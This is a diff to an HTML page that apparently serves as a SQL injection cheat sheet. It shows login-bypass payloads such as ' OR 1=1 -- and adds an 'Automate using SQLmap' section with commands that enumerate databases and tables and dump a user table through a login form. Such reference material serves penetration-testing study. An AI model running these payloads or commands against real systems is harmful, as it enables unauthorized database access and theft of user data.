@@ -69,6 +69,13 @@
     " OR "1"="1" --
     ' OR 1=1 --
     ' --</code></pre>
+                    <h3>Automate using SQLmap</h3> 
+                    <p>Some basic commands</p>
+                    <pre><code class="language-bashd">sqlmap -u http://domain.com/login --data "email=hola&password=test" --dbs                   #Show database
+sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main --tables        #Show tables from main database
+sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main -T user --dump  #Show all info from that table</code></pre>
+                    
+
                     <h3> Microsoft, PostgreSQL, MySQL </h3>            
                     <h4> Show all database tables</h4>
                     
